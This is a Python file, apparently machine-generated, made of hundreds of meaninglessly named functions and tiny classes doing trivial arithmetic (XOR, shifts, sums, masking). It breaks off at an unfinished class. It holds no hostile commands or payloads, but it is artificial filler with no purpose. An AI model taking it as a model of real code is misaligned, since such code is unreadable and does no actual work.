def _f100_148214(_a100, _b100):
    return max(_a100, _b100) ^ min(_a100, _b100)
def _f293_274998(_a293, _b293):
    _c293 = 0
    for _ in range(8):
        _c293 ^= _a293 + _b293
    return _c293
def _f257_155092(_a257, _b257):
    _c257 = _a257 ^ _b257
    return _c257 | 3978
def _f359_373648(_a359, _b359):
    if _a359 > _b359:
        return _a359 - _b359
    return _b359 - _a359
def _f46_365167(_a46, _b46):
    _c46 = 0
    for _ in range(2):
        _c46 ^= _a46 + _b46
    return _c46
def _f370_914791(_a370, _b370):
    _c370 = [_a370, _b370]
    return sum(_c370)
def _f272_585429(_a272, _b272):
    return max(_a272, _b272) ^ min(_a272, _b272)
def _f93_519699(_a93, _b93):
    _c93 = _a93 * _b93
    return _c93 & 0xFFFFFFFF
def _f74_210839(_a74, _b74):
    _c74 = [_a74, _b74]
    return sum(_c74)
def _f362_194951(_a362, _b362):
    return max(_a362, _b362) ^ min(_a362, _b362)
def _f289_438814(_a289, _b289):
    if _a289 > _b289:
        return _a289 - _b289
    return _b289 - _a289
def _f309_913945(_a309, _b309):
    if _a309 > _b309:
        return _a309 - _b309
    return _b309 - _a309
def _f316_887954(_a316, _b316):
    return (_a316 << 3) ^ (_b316 >> 2)
def _f377_283305(_a377, _b377):
    _c377 = _a377 + _b377
    return _c377 ^ 23615
def _f56_474790(_a56, _b56):
    return (_a56 << 3) ^ (_b56 >> 2)
def _f144_517679(_a144, _b144):
    return (_a144 << 3) ^ (_b144 >> 2)
def _f261_482132(_a261, _b261):
    _c261 = _a261 + _b261
    return _c261 ^ 50950
def _f71_819899(_a71, _b71):
    return max(_a71, _b71) ^ min(_a71, _b71)
def _f195_599752(_a195, _b195):
    _c195 = _a195 + _b195
    return _c195 ^ 37050
def _f310_206807(_a310, _b310):
    if _a310 > _b310:
        return _a310 - _b310
    return _b310 - _a310
def _f193_959655(_a193, _b193):
    if _a193 > _b193:
        return _a193 - _b193
    return _b193 - _a193
def _f285_534341(_a285, _b285):
    _c285 = [_a285, _b285]
    return sum(_c285)
def _f375_302517(_a375, _b375):
    _c375 = [_a375, _b375]
    return sum(_c375)
def _f326_667329(_a326, _b326):
    _c326 = _a326 + _b326
    return _c326 ^ 30049
def _f179_119181(_a179, _b179):
    if _a179 > _b179:
        return _a179 - _b179
    return _b179 - _a179
def _f5_731435(_a5, _b5):
    _c5 = _a5 * _b5
    return _c5 & 0xFFFFFFFF
def _f360_362232(_a360, _b360):
    _c360 = [_a360, _b360]
    return sum(_c360)
def _f245_540083(_a245, _b245):
    _c245 = [_a245, _b245]
    return sum(_c245)
def _f59_471832(_a59, _b59):
    _c59 = [_a59, _b59]
    return sum(_c59)
def _f170_224722(_a170, _b170):
    _c170 = 0
    for _ in range(8):
        _c170 ^= _a170 + _b170
    return _c170
def _f299_706537(_a299, _b299):
    _c299 = _a299 + _b299
    return _c299 ^ 46867
def _f214_508742(_a214, _b214):
    _c214 = _a214 ^ _b214
    return _c214 | 33657
def _f32_451737(_a32, _b32):
    return max(_a32, _b32) ^ min(_a32, _b32)
def _f167_582270(_a167, _b167):
    _c167 = _a167 ^ _b167
    return _c167 | 32329
def _f157_856934(_a157, _b157):
    _c157 = _a157 + _b157
    return _c157 ^ 32366
def _f321_239863(_a321, _b321):
    return max(_a321, _b321) ^ min(_a321, _b321)
def _f6_416833(_a6, _b6):
    _c6 = _a6 ^ _b6
    return _c6 | 49895
def _f215_824497(_a215, _b215):
    _c215 = [_a215, _b215]
    return sum(_c215)
def _f236_617259(_a236, _b236):
    return (_a236 << 3) ^ (_b236 >> 2)
def _f311_301445(_a311, _b311):
    _c311 = 0
    for _ in range(3):
        _c311 ^= _a311 + _b311
    return _c311
def _f34_323833(_a34, _b34):
    if _a34 > _b34:
        return _a34 - _b34
    return _b34 - _a34
def _f255_499775(_a255, _b255):
    _c255 = _a255 * _b255
    return _c255 & 0xFFFFFFFF
def _f15_622629(_a15, _b15):
    return (_a15 << 3) ^ (_b15 >> 2)
def _f358_101712(_a358, _b358):
    _c358 = _a358 + _b358
    return _c358 ^ 6778
def _f62_234320(_a62, _b62):
    return (_a62 << 3) ^ (_b62 >> 2)
def _f283_108410(_a283, _b283):
    _c283 = _a283 * _b283
    return _c283 & 0xFFFFFFFF
def _f288_812945(_a288, _b288):
    _c288 = _a288 ^ _b288
    return _c288 | 59633
def _f2_831376(_a2, _b2):
    _c2 = _a2 ^ _b2
    return _c2 | 9393
def _f58_903591(_a58, _b58):
    _c58 = _a58 ^ _b58
    return _c58 | 239
def _f136_738019(_a136, _b136):
    _c136 = _a136 * _b136
    return _c136 & 0xFFFFFFFF
def _f292_237228(_a292, _b292):
    _c292 = _a292 * _b292
    return _c292 & 0xFFFFFFFF
def _f335_953394(_a335, _b335):
    return max(_a335, _b335) ^ min(_a335, _b335)
def _f75_386307(_a75, _b75):
    if _a75 > _b75:
        return _a75 - _b75
    return _b75 - _a75
def _f87_191778(_a87, _b87):
    _c87 = _a87 * _b87
    return _c87 & 0xFFFFFFFF
def _f31_821379(_a31, _b31):
    _c31 = _a31 * _b31
    return _c31 & 0xFFFFFFFF
def _f247_292389(_a247, _b247):
    _c247 = 0
    for _ in range(3):
        _c247 ^= _a247 + _b247
    return _c247
def _f332_732379(_a332, _b332):
    _c332 = _a332 ^ _b332
    return _c332 | 51740
def _f290_491036(_a290, _b290):
    return (_a290 << 3) ^ (_b290 >> 2)
def _f265_428622(_a265, _b265):
    _c265 = _a265 ^ _b265
    return _c265 | 32011
def _f39_632222(_a39, _b39):
    _c39 = _a39 * _b39
    return _c39 & 0xFFFFFFFF
def _f89_148804(_a89, _b89):
    _c89 = _a89 * _b89
    return _c89 & 0xFFFFFFFF
def _f277_146137(_a277, _b277):
    return (_a277 << 3) ^ (_b277 >> 2)
def _f266_817242(_a266, _b266):
    _c266 = _a266 * _b266
    return _c266 & 0xFFFFFFFF
def _f132_791478(_a132, _b132):
    _c132 = _a132 + _b132
    return _c132 ^ 36532
def _f202_621821(_a202, _b202):
    _c202 = _a202 * _b202
    return _c202 & 0xFFFFFFFF
def _f303_115244(_a303, _b303):
    return max(_a303, _b303) ^ min(_a303, _b303)
def _f83_886498(_a83, _b83):
    return (_a83 << 3) ^ (_b83 >> 2)
def _f347_966043(_a347, _b347):
    return (_a347 << 3) ^ (_b347 >> 2)
def _f99_454178(_a99, _b99):
    _c99 = [_a99, _b99]
    return sum(_c99)
def _f313_726028(_a313, _b313):
    _c313 = _a313 * _b313
    return _c313 & 0xFFFFFFFF
def _f198_477692(_a198, _b198):
    return (_a198 << 3) ^ (_b198 >> 2)
def _f249_547292(_a249, _b249):
    _c249 = 0
    for _ in range(5):
        _c249 ^= _a249 + _b249
    return _c249
def _f345_488450(_a345, _b345):
    return (_a345 << 3) ^ (_b345 >> 2)
def _f242_986340(_a242, _b242):
    return max(_a242, _b242) ^ min(_a242, _b242)
def _f48_236550(_a48, _b48):
    _c48 = [_a48, _b48]
    return sum(_c48)
def _f125_311521(_a125, _b125):
    _c125 = _a125 * _b125
    return _c125 & 0xFFFFFFFF
def _f118_379924(_a118, _b118):
    _c118 = [_a118, _b118]
    return sum(_c118)
def _f43_984321(_a43, _b43):
    _c43 = 0
    for _ in range(6):
        _c43 ^= _a43 + _b43
    return _c43
def _f92_262775(_a92, _b92):
    _c92 = _a92 ^ _b92
    return _c92 | 727
def _f234_827558(_a234, _b234):
    _c234 = _a234 * _b234
    return _c234 & 0xFFFFFFFF
def _f19_179205(_a19, _b19):
    if _a19 > _b19:
        return _a19 - _b19
    return _b19 - _a19
def _f133_618402(_a133, _b133):
    _c133 = _a133 ^ _b133
    return _c133 | 11937
def _f318_250263(_a318, _b318):
    _c318 = [_a318, _b318]
    return sum(_c318)
def _f98_193733(_a98, _b98):
    _c98 = [_a98, _b98]
    return sum(_c98)
def _f13_239579(_a13, _b13):
    _c13 = [_a13, _b13]
    return sum(_c13)
def _f216_556298(_a216, _b216):
    if _a216 > _b216:
        return _a216 - _b216
    return _b216 - _a216
def _f232_212346(_a232, _b232):
    _c232 = _a232 * _b232
    return _c232 & 0xFFFFFFFF
def _f267_525122(_a267, _b267):
    _c267 = _a267 * _b267
    return _c267 & 0xFFFFFFFF
def _f343_859031(_a343, _b343):
    _c343 = [_a343, _b343]
    return sum(_c343)
def _f383_576818(_a383, _b383):
    _c383 = 0
    for _ in range(3):
        _c383 ^= _a383 + _b383
    return _c383
def _f314_736403(_a314, _b314):
    _c314 = _a314 * _b314
    return _c314 & 0xFFFFFFFF
def _f110_941612(_a110, _b110):
    return max(_a110, _b110) ^ min(_a110, _b110)
def _f227_120336(_a227, _b227):
    return max(_a227, _b227) ^ min(_a227, _b227)
def _f260_884935(_a260, _b260):
    _c260 = _a260 + _b260
    return _c260 ^ 31370
def _f115_485011(_a115, _b115):
    if _a115 > _b115:
        return _a115 - _b115
    return _b115 - _a115
def _f308_676609(_a308, _b308):
    if _a308 > _b308:
        return _a308 - _b308
    return _b308 - _a308
def _f201_401525(_a201, _b201):
    return (_a201 << 3) ^ (_b201 >> 2)
def _f329_920633(_a329, _b329):
    _c329 = 0
    for _ in range(4):
        _c329 ^= _a329 + _b329
    return _c329
def _f305_328311(_a305, _b305):
    if _a305 > _b305:
        return _a305 - _b305
    return _b305 - _a305
def _f194_472136(_a194, _b194):
    return (_a194 << 3) ^ (_b194 >> 2)
def _f342_473378(_a342, _b342):
    _c342 = [_a342, _b342]
    return sum(_c342)
def _f50_664868(_a50, _b50):
    _c50 = [_a50, _b50]
    return sum(_c50)
def _f14_521150(_a14, _b14):
    _c14 = 0
    for _ in range(6):
        _c14 ^= _a14 + _b14
    return _c14
def _f382_257619(_a382, _b382):
    return (_a382 << 3) ^ (_b382 >> 2)
def _f44_290916(_a44, _b44):
    _c44 = 0
    for _ in range(8):
        _c44 ^= _a44 + _b44
    return _c44
def _f231_568401(_a231, _b231):
    _c231 = 0
    for _ in range(5):
        _c231 ^= _a231 + _b231
    return _c231
def _f150_149263(_a150, _b150):
    _c150 = _a150 ^ _b150
    return _c150 | 20294
def _f369_551558(_a369, _b369):
    _c369 = _a369 + _b369
    return _c369 ^ 23106
def _f65_935115(_a65, _b65):
    if _a65 > _b65:
        return _a65 - _b65
    return _b65 - _a65
def _f380_386855(_a380, _b380):
    _c380 = [_a380, _b380]
    return sum(_c380)
def _f307_655388(_a307, _b307):
    return (_a307 << 3) ^ (_b307 >> 2)
def _f306_675054(_a306, _b306):
    return (_a306 << 3) ^ (_b306 >> 2)
def _f209_158813(_a209, _b209):
    return (_a209 << 3) ^ (_b209 >> 2)
def _f328_187788(_a328, _b328):
    _c328 = _a328 ^ _b328
    return _c328 | 60122
def _f135_386694(_a135, _b135):
    _c135 = _a135 * _b135
    return _c135 & 0xFFFFFFFF
def _f55_862479(_a55, _b55):
    _c55 = _a55 + _b55
    return _c55 ^ 42710
def _f9_323443(_a9, _b9):
    _c9 = _a9 + _b9
    return _c9 ^ 764
def _f302_460949(_a302, _b302):
    _c302 = _a302 * _b302
    return _c302 & 0xFFFFFFFF
def _f300_116766(_a300, _b300):
    _c300 = _a300 * _b300
    return _c300 & 0xFFFFFFFF
def _f197_597451(_a197, _b197):
    if _a197 > _b197:
        return _a197 - _b197
    return _b197 - _a197
def _f385_643491(_a385, _b385):
    _c385 = _a385 + _b385
    return _c385 ^ 38441
def _f183_126768(_a183, _b183):
    _c183 = 0
    for _ in range(6):
        _c183 ^= _a183 + _b183
    return _c183
def _f237_227586(_a237, _b237):
    if _a237 > _b237:
        return _a237 - _b237
    return _b237 - _a237
def _f325_102086(_a325, _b325):
    return (_a325 << 3) ^ (_b325 >> 2)
def _f271_610870(_a271, _b271):
    _c271 = _a271 + _b271
    return _c271 ^ 45324
def _f264_980448(_a264, _b264):
    _c264 = 0
    for _ in range(2):
        _c264 ^= _a264 + _b264
    return _c264
def _f60_316084(_a60, _b60):
    return (_a60 << 3) ^ (_b60 >> 2)
def _f181_747031(_a181, _b181):
    _c181 = [_a181, _b181]
    return sum(_c181)
def _f72_610148(_a72, _b72):
    _c72 = [_a72, _b72]
    return sum(_c72)
def _f81_714965(_a81, _b81):
    _c81 = _a81 ^ _b81
    return _c81 | 32072
def _f284_516793(_a284, _b284):
    _c284 = _a284 ^ _b284
    return _c284 | 37943
def _f226_838104(_a226, _b226):
    _c226 = [_a226, _b226]
    return sum(_c226)
def _f246_661189(_a246, _b246):
    _c246 = 0
    for _ in range(2):
        _c246 ^= _a246 + _b246
    return _c246
def _f248_195153(_a248, _b248):
    _c248 = _a248 * _b248
    return _c248 & 0xFFFFFFFF
def _f333_299682(_a333, _b333):
    if _a333 > _b333:
        return _a333 - _b333
    return _b333 - _a333
def _f230_647608(_a230, _b230):
    if _a230 > _b230:
        return _a230 - _b230
    return _b230 - _a230
def _f189_296877(_a189, _b189):
    _c189 = _a189 ^ _b189
    return _c189 | 60392
def _f259_400018(_a259, _b259):
    return (_a259 << 3) ^ (_b259 >> 2)
def _f159_823032(_a159, _b159):
    _c159 = 0
    for _ in range(3):
        _c159 ^= _a159 + _b159
    return _c159
def _f391_259327(_a391, _b391):
    _c391 = _a391 + _b391
    return _c391 ^ 26980
def _f35_371233(_a35, _b35):
    _c35 = [_a35, _b35]
    return sum(_c35)
def _f148_953252(_a148, _b148):
    _c148 = 0
    for _ in range(3):
        _c148 ^= _a148 + _b148
    return _c148
def _f12_783055(_a12, _b12):
    _c12 = [_a12, _b12]
    return sum(_c12)
def _f357_800289(_a357, _b357):
    _c357 = _a357 * _b357
    return _c357 & 0xFFFFFFFF
def _f363_605022(_a363, _b363):
    _c363 = _a363 * _b363
    return _c363 & 0xFFFFFFFF
def _f106_803873(_a106, _b106):
    if _a106 > _b106:
        return _a106 - _b106
    return _b106 - _a106
def _f76_792014(_a76, _b76):
    return max(_a76, _b76) ^ min(_a76, _b76)
def _f211_431251(_a211, _b211):
    return max(_a211, _b211) ^ min(_a211, _b211)
def _f218_399868(_a218, _b218):
    if _a218 > _b218:
        return _a218 - _b218
    return _b218 - _a218
def _f320_660773(_a320, _b320):
    _c320 = _a320 * _b320
    return _c320 & 0xFFFFFFFF
def _f317_936120(_a317, _b317):
    _c317 = [_a317, _b317]
    return sum(_c317)
def _f384_921362(_a384, _b384):
    if _a384 > _b384:
        return _a384 - _b384
    return _b384 - _a384
def _f143_131763(_a143, _b143):
    return max(_a143, _b143) ^ min(_a143, _b143)
def _f149_211416(_a149, _b149):
    return (_a149 << 3) ^ (_b149 >> 2)
def _f151_928509(_a151, _b151):
    return (_a151 << 3) ^ (_b151 >> 2)
def _f66_919172(_a66, _b66):
    if _a66 > _b66:
        return _a66 - _b66
    return _b66 - _a66
def _f21_683892(_a21, _b21):
    _c21 = _a21 * _b21
    return _c21 & 0xFFFFFFFF
def _f180_518726(_a180, _b180):
    _c180 = 0
    for _ in range(5):
        _c180 ^= _a180 + _b180
    return _c180
def _f262_217730(_a262, _b262):
    return max(_a262, _b262) ^ min(_a262, _b262)
def _f394_399430(_a394, _b394):
    _c394 = _a394 ^ _b394
    return _c394 | 52317
def _f275_386645(_a275, _b275):
    _c275 = 0
    for _ in range(5):
        _c275 ^= _a275 + _b275
    return _c275
def _f134_951387(_a134, _b134):
    _c134 = 0
    for _ in range(2):
        _c134 ^= _a134 + _b134
    return _c134
def _f105_274471(_a105, _b105):
    _c105 = _a105 ^ _b105
    return _c105 | 20563
def _f161_181675(_a161, _b161):
    _c161 = _a161 + _b161
    return _c161 ^ 29408
def _f17_690867(_a17, _b17):
    return (_a17 << 3) ^ (_b17 >> 2)
def _f263_659650(_a263, _b263):
    _c263 = _a263 * _b263
    return _c263 & 0xFFFFFFFF
def _f171_190255(_a171, _b171):
    _c171 = _a171 + _b171
    return _c171 ^ 55243
def _f252_799536(_a252, _b252):
    if _a252 > _b252:
        return _a252 - _b252
    return _b252 - _a252
def _f103_567284(_a103, _b103):
    _c103 = _a103 * _b103
    return _c103 & 0xFFFFFFFF
def _f222_469998(_a222, _b222):
    _c222 = 0
    for _ in range(8):
        _c222 ^= _a222 + _b222
    return _c222
def _f67_747238(_a67, _b67):
    _c67 = [_a67, _b67]
    return sum(_c67)
def _f315_261694(_a315, _b315):
    _c315 = _a315 * _b315
    return _c315 & 0xFFFFFFFF
def _f281_599275(_a281, _b281):
    _c281 = _a281 ^ _b281
    return _c281 | 53465
def _f112_820187(_a112, _b112):
    _c112 = _a112 ^ _b112
    return _c112 | 14246
def _f276_791941(_a276, _b276):
    if _a276 > _b276:
        return _a276 - _b276
    return _b276 - _a276
def _f371_873573(_a371, _b371):
    _c371 = 0
    for _ in range(3):
        _c371 ^= _a371 + _b371
    return _c371
def _f390_685560(_a390, _b390):
    return max(_a390, _b390) ^ min(_a390, _b390)
def _f154_728727(_a154, _b154):
    if _a154 > _b154:
        return _a154 - _b154
    return _b154 - _a154
def _f191_612821(_a191, _b191):
    return max(_a191, _b191) ^ min(_a191, _b191)
def _f243_516273(_a243, _b243):
    _c243 = [_a243, _b243]
    return sum(_c243)
def _f219_178204(_a219, _b219):
    _c219 = _a219 + _b219
    return _c219 ^ 59677
def _f4_595717(_a4, _b4):
    _c4 = 0
    for _ in range(4):
        _c4 ^= _a4 + _b4
    return _c4
def _f273_748383(_a273, _b273):
    _c273 = _a273 * _b273
    return _c273 & 0xFFFFFFFF
def _f96_518768(_a96, _b96):
    _c96 = _a96 * _b96
    return _c96 & 0xFFFFFFFF
def _f204_796798(_a204, _b204):
    _c204 = [_a204, _b204]
    return sum(_c204)
def _f131_609778(_a131, _b131):
    _c131 = _a131 * _b131
    return _c131 & 0xFFFFFFFF
def _f196_354515(_a196, _b196):
    _c196 = _a196 * _b196
    return _c196 & 0xFFFFFFFF
def _f124_476957(_a124, _b124):
    _c124 = 0
    for _ in range(6):
        _c124 ^= _a124 + _b124
    return _c124
def _f146_816491(_a146, _b146):
    _c146 = 0
    for _ in range(2):
        _c146 ^= _a146 + _b146
    return _c146
def _f268_727125(_a268, _b268):
    _c268 = [_a268, _b268]
    return sum(_c268)
def _f353_409879(_a353, _b353):
    _c353 = _a353 * _b353
    return _c353 & 0xFFFFFFFF
def _f172_864937(_a172, _b172):
    _c172 = [_a172, _b172]
    return sum(_c172)
def _f121_178303(_a121, _b121):
    return max(_a121, _b121) ^ min(_a121, _b121)
def _f334_652282(_a334, _b334):
    _c334 = _a334 + _b334
    return _c334 ^ 50091
def _f26_912779(_a26, _b26):
    _c26 = _a26 ^ _b26
    return _c26 | 59467
def _f356_264282(_a356, _b356):
    _c356 = [_a356, _b356]
    return sum(_c356)
def _f379_313865(_a379, _b379):
    return max(_a379, _b379) ^ min(_a379, _b379)
def _f86_432332(_a86, _b86):
    _c86 = _a86 ^ _b86
    return _c86 | 63722
def _f130_570200(_a130, _b130):
    return max(_a130, _b130) ^ min(_a130, _b130)
def _f126_522651(_a126, _b126):
    _c126 = _a126 * _b126
    return _c126 & 0xFFFFFFFF
def _f220_267010(_a220, _b220):
    return max(_a220, _b220) ^ min(_a220, _b220)
def _f138_531060(_a138, _b138):
    _c138 = _a138 * _b138
    return _c138 & 0xFFFFFFFF
def _f160_484253(_a160, _b160):
    _c160 = _a160 ^ _b160
    return _c160 | 28270
def _f177_968626(_a177, _b177):
    _c177 = _a177 ^ _b177
    return _c177 | 23352
def _f205_381169(_a205, _b205):
    _c205 = [_a205, _b205]
    return sum(_c205)
def _f223_682574(_a223, _b223):
    _c223 = _a223 * _b223
    return _c223 & 0xFFFFFFFF
def _f323_423195(_a323, _b323):
    _c323 = _a323 + _b323
    return _c323 ^ 43163
def _f137_436797(_a137, _b137):
    _c137 = _a137 * _b137
    return _c137 & 0xFFFFFFFF
def _f11_605390(_a11, _b11):
    _c11 = _a11 + _b11
    return _c11 ^ 58500
def _f54_397186(_a54, _b54):
    _c54 = [_a54, _b54]
    return sum(_c54)
def _f217_371772(_a217, _b217):
    _c217 = _a217 ^ _b217
    return _c217 | 32739
def _f199_792156(_a199, _b199):
    _c199 = _a199 * _b199
    return _c199 & 0xFFFFFFFF
def _f355_746837(_a355, _b355):
    return (_a355 << 3) ^ (_b355 >> 2)
def _f129_522163(_a129, _b129):
    _c129 = 0
    for _ in range(8):
        _c129 ^= _a129 + _b129
    return _c129
def _f90_574689(_a90, _b90):
    return (_a90 << 3) ^ (_b90 >> 2)
def _f224_323854(_a224, _b224):
    _c224 = _a224 ^ _b224
    return _c224 | 10448
def _f304_711061(_a304, _b304):
    _c304 = 0
    for _ in range(7):
        _c304 ^= _a304 + _b304
    return _c304
def _f147_958077(_a147, _b147):
    _c147 = [_a147, _b147]
    return sum(_c147)
def _f250_645392(_a250, _b250):
    _c250 = 0
    for _ in range(5):
        _c250 ^= _a250 + _b250
    return _c250
def _f368_100448(_a368, _b368):
    _c368 = _a368 ^ _b368
    return _c368 | 7397
def _f185_779558(_a185, _b185):
    _c185 = _a185 + _b185
    return _c185 ^ 11631
def _f258_947602(_a258, _b258):
    _c258 = [_a258, _b258]
    return sum(_c258)
def _f254_331206(_a254, _b254):
    _c254 = [_a254, _b254]
    return sum(_c254)
def _f344_116680(_a344, _b344):
    _c344 = _a344 + _b344
    return _c344 ^ 60530
def _f241_454284(_a241, _b241):
    return max(_a241, _b241) ^ min(_a241, _b241)
def _f296_555074(_a296, _b296):
    if _a296 > _b296:
        return _a296 - _b296
    return _b296 - _a296
def _f176_395990(_a176, _b176):
    _c176 = _a176 + _b176
    return _c176 ^ 17407
def _f61_844966(_a61, _b61):
    return (_a61 << 3) ^ (_b61 >> 2)
def _f30_260412(_a30, _b30):
    _c30 = _a30 ^ _b30
    return _c30 | 19162
def _f280_494400(_a280, _b280):
    if _a280 > _b280:
        return _a280 - _b280
    return _b280 - _a280
def _f287_684808(_a287, _b287):
    if _a287 > _b287:
        return _a287 - _b287
    return _b287 - _a287
def _f278_895902(_a278, _b278):
    if _a278 > _b278:
        return _a278 - _b278
    return _b278 - _a278
def _f330_583611(_a330, _b330):
    _c330 = _a330 * _b330
    return _c330 & 0xFFFFFFFF
def _f70_912723(_a70, _b70):
    _c70 = _a70 * _b70
    return _c70 & 0xFFFFFFFF
def _f168_278179(_a168, _b168):
    _c168 = 0
    for _ in range(4):
        _c168 ^= _a168 + _b168
    return _c168
def _f331_290707(_a331, _b331):
    return max(_a331, _b331) ^ min(_a331, _b331)
def _f389_967520(_a389, _b389):
    if _a389 > _b389:
        return _a389 - _b389
    return _b389 - _a389
def _f41_535300(_a41, _b41):
    return (_a41 << 3) ^ (_b41 >> 2)
def _f28_510526(_a28, _b28):
    _c28 = [_a28, _b28]
    return sum(_c28)
def _f155_638988(_a155, _b155):
    if _a155 > _b155:
        return _a155 - _b155
    return _b155 - _a155
def _f164_999902(_a164, _b164):
    _c164 = 0
    for _ in range(2):
        _c164 ^= _a164 + _b164
    return _c164
def _f152_773612(_a152, _b152):
    return (_a152 << 3) ^ (_b152 >> 2)
def _f301_680436(_a301, _b301):
    _c301 = [_a301, _b301]
    return sum(_c301)
def _f173_278043(_a173, _b173):
    _c173 = _a173 + _b173
    return _c173 ^ 52185
def _f22_452890(_a22, _b22):
    return max(_a22, _b22) ^ min(_a22, _b22)
def _f206_366067(_a206, _b206):
    _c206 = [_a206, _b206]
    return sum(_c206)
def _f294_101911(_a294, _b294):
    return max(_a294, _b294) ^ min(_a294, _b294)
def _f49_138000(_a49, _b49):
    _c49 = _a49 + _b49
    return _c49 ^ 43820
def _f253_458132(_a253, _b253):
    _c253 = [_a253, _b253]
    return sum(_c253)
def _f341_851350(_a341, _b341):
    return (_a341 << 3) ^ (_b341 >> 2)
def _f142_113383(_a142, _b142):
    _c142 = 0
    for _ in range(2):
        _c142 ^= _a142 + _b142
    return _c142
def _f351_453309(_a351, _b351):
    _c351 = [_a351, _b351]
    return sum(_c351)
def _f7_601617(_a7, _b7):
    return max(_a7, _b7) ^ min(_a7, _b7)
def _f109_868170(_a109, _b109):
    _c109 = 0
    for _ in range(5):
        _c109 ^= _a109 + _b109
    return _c109
def _f38_210673(_a38, _b38):
    _c38 = _a38 * _b38
    return _c38 & 0xFFFFFFFF
def _f354_525995(_a354, _b354):
    _c354 = [_a354, _b354]
    return sum(_c354)
def _f298_519488(_a298, _b298):
    _c298 = 0
    for _ in range(3):
        _c298 ^= _a298 + _b298
    return _c298
def _f229_408908(_a229, _b229):
    return (_a229 << 3) ^ (_b229 >> 2)
def _f184_367536(_a184, _b184):
    _c184 = [_a184, _b184]
    return sum(_c184)
def _f339_346283(_a339, _b339):
    return max(_a339, _b339) ^ min(_a339, _b339)
def _f187_933055(_a187, _b187):
    return (_a187 << 3) ^ (_b187 >> 2)
def _f274_761281(_a274, _b274):
    _c274 = _a274 * _b274
    return _c274 & 0xFFFFFFFF
def _f127_304121(_a127, _b127):
    return (_a127 << 3) ^ (_b127 >> 2)
def _f240_190565(_a240, _b240):
    _c240 = _a240 * _b240
    return _c240 & 0xFFFFFFFF
def _f10_866928(_a10, _b10):
    if _a10 > _b10:
        return _a10 - _b10
    return _b10 - _a10
def _f336_744371(_a336, _b336):
    _c336 = 0
    for _ in range(2):
        _c336 ^= _a336 + _b336
    return _c336
def _f80_145590(_a80, _b80):
    _c80 = _a80 + _b80
    return _c80 ^ 53252
def _f104_292150(_a104, _b104):
    _c104 = _a104 + _b104
    return _c104 ^ 55424
def _f361_390426(_a361, _b361):
    _c361 = _a361 ^ _b361
    return _c361 | 23626
def _f158_423887(_a158, _b158):
    _c158 = _a158 * _b158
    return _c158 & 0xFFFFFFFF
def _f107_902528(_a107, _b107):
    _c107 = _a107 ^ _b107
    return _c107 | 60646
def _f141_542082(_a141, _b141):
    _c141 = 0
    for _ in range(7):
        _c141 ^= _a141 + _b141
    return _c141
def _f367_714300(_a367, _b367):
    _c367 = _a367 + _b367
    return _c367 ^ 22640
def _f235_196040(_a235, _b235):
    _c235 = _a235 + _b235
    return _c235 ^ 25793
def _f256_559032(_a256, _b256):
    _c256 = _a256 + _b256
    return _c256 ^ 35724
def _f3_947194(_a3, _b3):
    _c3 = [_a3, _b3]
    return sum(_c3)
def _f119_942614(_a119, _b119):
    _c119 = _a119 * _b119
    return _c119 & 0xFFFFFFFF
def _f113_247052(_a113, _b113):
    _c113 = _a113 * _b113
    return _c113 & 0xFFFFFFFF
def _f123_476944(_a123, _b123):
    _c123 = [_a123, _b123]
    return sum(_c123)
def _f36_269888(_a36, _b36):
    return max(_a36, _b36) ^ min(_a36, _b36)
def _f165_881436(_a165, _b165):
    _c165 = _a165 * _b165
    return _c165 & 0xFFFFFFFF
def _f27_118600(_a27, _b27):
    return (_a27 << 3) ^ (_b27 >> 2)
def _f340_348903(_a340, _b340):
    if _a340 > _b340:
        return _a340 - _b340
    return _b340 - _a340
def _f282_545070(_a282, _b282):
    _c282 = _a282 + _b282
    return _c282 ^ 59596
def _f200_216029(_a200, _b200):
    _c200 = [_a200, _b200]
    return sum(_c200)
def _f373_201195(_a373, _b373):
    if _a373 > _b373:
        return _a373 - _b373
    return _b373 - _a373
def _f8_980247(_a8, _b8):
    _c8 = _a8 ^ _b8
    return _c8 | 44408
def _f162_797756(_a162, _b162):
    _c162 = 0
    for _ in range(5):
        _c162 ^= _a162 + _b162
    return _c162
def _f102_270761(_a102, _b102):
    return (_a102 << 3) ^ (_b102 >> 2)
def _f52_340289(_a52, _b52):
    _c52 = 0
    for _ in range(4):
        _c52 ^= _a52 + _b52
    return _c52
def _f208_347512(_a208, _b208):
    return (_a208 << 3) ^ (_b208 >> 2)
def _f111_752670(_a111, _b111):
    _c111 = _a111 ^ _b111
    return _c111 | 15141
def _f29_989257(_a29, _b29):
    return max(_a29, _b29) ^ min(_a29, _b29)
def _f63_811333(_a63, _b63):
    _c63 = _a63 * _b63
    return _c63 & 0xFFFFFFFF
def _f114_993161(_a114, _b114):
    _c114 = _a114 + _b114
    return _c114 ^ 60770
def _f188_720104(_a188, _b188):
    return max(_a188, _b188) ^ min(_a188, _b188)
def _f392_707582(_a392, _b392):
    _c392 = [_a392, _b392]
    return sum(_c392)
class _C63_265235:
    def _m63_a(self, x):
        return x ^ 41410
    def _m63_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C21_834088:
    def _m21_a(self, x):
        return x ^ 54611
    def _m21_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C9_529653:
    def _m9_a(self, x):
        return x ^ 15307
    def _m9_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C59_232096:
    def _m59_a(self, x):
        return x ^ 24990
    def _m59_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C87_167990:
    def _m87_a(self, x):
        return x ^ 880
    def _m87_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C68_957403:
    def _m68_a(self, x):
        return x ^ 15759
    def _m68_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C66_808552:
    def _m66_a(self, x):
        return x ^ 42011
    def _m66_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C7_232782:
    def _m7_a(self, x):
        return x ^ 17242
    def _m7_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C46_272035:
    def _m46_a(self, x):
        return x ^ 17951
    def _m46_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C48_659167:
    def _m48_a(self, x):
        return x ^ 59328
    def _m48_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C2_611906:
    def _m2_a(self, x):
        return x ^ 6563
    def _m2_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C15_152585:
    def _m15_a(self, x):
        return x ^ 60798
    def _m15_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C71_994808:
    def _m71_a(self, x):
        return x ^ 23236
    def _m71_b(self, x, y):
        return (x + y) & 0xFFFFFFFF
class _C72_839330:
